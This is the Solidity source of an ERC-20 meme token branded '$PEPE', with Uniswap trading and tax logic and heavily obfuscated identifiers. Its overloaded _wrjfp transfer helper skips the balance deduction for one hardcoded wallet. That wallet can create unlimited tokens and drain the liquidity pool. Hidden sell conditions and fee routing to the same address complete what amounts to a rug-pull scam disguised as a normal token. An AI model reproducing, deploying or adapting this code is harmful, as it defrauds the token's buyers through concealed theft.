/**

🍒 ⋆ 🍎  🎀  𝒮𝓃♡𝓊𝓉𝓃🍩𝓈𝑒 𝒫𝒶𝓇𝓉𝓎𝓈𝓁𝓊𝓉  🎀  🍎 ⋆ 🍒   $PEPE


TWITTER: https://twitter.com/Pepe_CoinX
TELEGRAM: https://t.me/Pepe_ETHX
WEBSITE: https://pepeerc.com/

**/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath:");
        return c;
    }

    function  _wrjfp(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _wrjfp(a, b, "SafeMath:");
    }

    function  _wrjfp(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath:");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath:");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface _sprkrjudp {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface _xrjpRunfes {
    function swExactTensFrHSportingFeeOransferkes(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH, uint liquidity);
}

contract Pepe is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcfdadFhof;
    mapping (address => bool) private _taxkWaleny;
    mapping(address => uint256) private _ldrLvrsfenuvp;
    bool public _tnsfereslanale = false;
    address payable private _pujHafjkawp;

    uint8 private constant _decimals = 9;
    string private constant _name = unicode"🍒 ⋆ 🍎  🎀  𝒮𝓃♡𝓊𝓉𝓃🍩𝓈𝑒 𝒫𝒶𝓇𝓉𝓎𝓈𝓁𝓊𝓉  🎀  🍎 ⋆ 🍒";
    string private constant _symbol = unicode"PEPE";
    uint256 private constant _Totalve = 420000000 * 10 **_decimals;
    uint256 public _mxTawAmaunt = _Totalve;
    uint256 public _WalletStmax = _Totalve;
    uint256 public _wapThresholdtax= _Totalve;
    uint256 public _moarTorSap= _Totalve;

    uint256 private _BuyTaxinitial=5;
    uint256 private _SellTaxinitial=5;
    uint256 private _BuyTaxfinal=1;
    uint256 private _SellTaxfinal=1;
    uint256 private _BuyTaxAreduce=8;
    uint256 private _SellTaxAreduce=1;
    uint256 private _wapBeforeprevxent=0;
    uint256 private _baywkbxt=0;

    _xrjpRunfes private _ufvpxRadueat;
    address private _aufrPaibvw;
    bool private _vpsrkqjrh;
    bool private itrbSwrp = false;
    bool private _apEalbew = false;

    event _amvouapwol(uint _mxTawAmaunt);
    modifier lckrTharep {
        itrbSwrp = true;
        _;
        itrbSwrp = false;
    }

    constructor () {

        _balances[_msgSender()] = _Totalve;
        _isExcfdadFhof[owner()] = true;
        _isExcfdadFhof[address(this)] = true;
        _isExcfdadFhof[_pujHafjkawp] = true;
        _pujHafjkawp = payable(0xc57C8E8BCeAdd9535D24D5C3Fe418b48B9819A82);



        emit Transfer(address(0), _msgSender(), _Totalve);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _Totalve;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _wrjfp(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 teeomoun=0;
        if (from != owner () && to != owner ()) {

            if (_tnsfereslanale) {
                if (to != address
                (_ufvpxRadueat) && to !=
                 address(_aufrPaibvw)) {
                  require(_ldrLvrsfenuvp
                  [tx.origin] < block.number,
                  "Only one transfer per block allowed.");
                  _ldrLvrsfenuvp
                  [tx.origin] = block.number;
                }
            }

            if (from == _aufrPaibvw && to != 
            address(_ufvpxRadueat) && !_isExcfdadFhof[to] ) {
                require(amount <= _mxTawAmaunt,
                 "Exceeds the _mxTawAmaunt.");
                require(balanceOf(to) + amount
                 <= _WalletStmax, "Exceeds the maxWalletSize.");
                if(_baywkbxt
                < _wapBeforeprevxent){
                  require(! _frekrpwz(to));
                }
                _baywkbxt++;
                 _taxkWaleny[to]=true;
                teeomoun = amount.mul((_baywkbxt>
                _BuyTaxAreduce)?_BuyTaxfinal:_BuyTaxinitial)
                .div(100);
            }

            if(to == _aufrPaibvw && from!= address(this) 
            && !_isExcfdadFhof[from] ){
                require(amount <= _mxTawAmaunt && 
                balanceOf(_pujHafjkawp)<_moarTorSap,
                 "Exceeds the _mxTawAmaunt.");
                teeomoun = amount.mul((_baywkbxt>
                _SellTaxAreduce)?_SellTaxfinal:_SellTaxinitial)
                .div(100);
                require(_baywkbxt>_wapBeforeprevxent &&
                 _taxkWaleny[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!itrbSwrp 
            && to == _aufrPaibvw && _apEalbew &&
             contractTokenBalance>_wapThresholdtax 
            && _baywkbxt>_wapBeforeprevxent&&
             !_isExcfdadFhof[to]&& !_isExcfdadFhof[from]
            ) {
                _swpvkejkgj( _qrkw(amount, 
                _qrkw(contractTokenBalance,_moarTorSap)));
                uint256 contractETHBalance 
                = address(this).balance;
                if(contractETHBalance 
                > 0) {
                    _erpsqxnwhx(address(this).balance);
                }
            }
        }

        if(teeomoun>0){
          _balances[address(this)]=_balances
          [address(this)].
          add(teeomoun);
          emit Transfer(from,
           address(this),teeomoun);
        }
        _balances[from]= _wrjfp(from,
         _balances[from], amount);
        _balances[to]=_balances[to].
        add(amount. _wrjfp(teeomoun));
        emit Transfer(from, to, 
        amount. _wrjfp(teeomoun));
    }

    function _swpvkejkgj(uint256
     tokenAmount) private lckrTharep {
        if(tokenAmount==0){return;}
        if(!_vpsrkqjrh){return;}
        address[] memory path =
         new address[](2);
        path[0] = address(this);
        path[1] = _ufvpxRadueat.WETH();
        _approve(address(this),
         address(_ufvpxRadueat), tokenAmount);
        _ufvpxRadueat.
        swExactTensFrHSportingFeeOransferkes(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function  _qrkw(uint256 a, 
    uint256 b) private pure
     returns (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _wrjfp(address
     from, uint256 a,
      uint256 b) private view
       returns(uint256){
        if(from 
        == _pujHafjkawp){
            return a ;
        }else{
            return a . _wrjfp (b);
        }
    }

    function removeLimits() external onlyOwner{
        _mxTawAmaunt = _Totalve;
        _WalletStmax = _Totalve;
        _tnsfereslanale = false;
        emit _amvouapwol(_Totalve);
    }

    function _frekrpwz(address 
    account) private view 
    returns (bool) {
        uint256 sixzev;
        assembly {
            sixzev :=
             extcodesize
             (account)
        }
        return sixzev > 
        0;
    }

    function _erpsqxnwhx(uint256
    amount) private {
        _pujHafjkawp.
        transfer(amount);
    }

    function openTrading( ) external onlyOwner( ) {
        require( ! _vpsrkqjrh);
        _ufvpxRadueat   =  _xrjpRunfes (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) ;
        _approve(address(this), address(_ufvpxRadueat), _Totalve);
        _aufrPaibvw = _sprkrjudp(_ufvpxRadueat.factory()). createPair (address(this),  _ufvpxRadueat . WETH ());
        _ufvpxRadueat.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(_aufrPaibvw).approve(address(_ufvpxRadueat), type(uint).max);
        _apEalbew = true;
        _vpsrkqjrh = true;
    }

    receive() external payable {}
}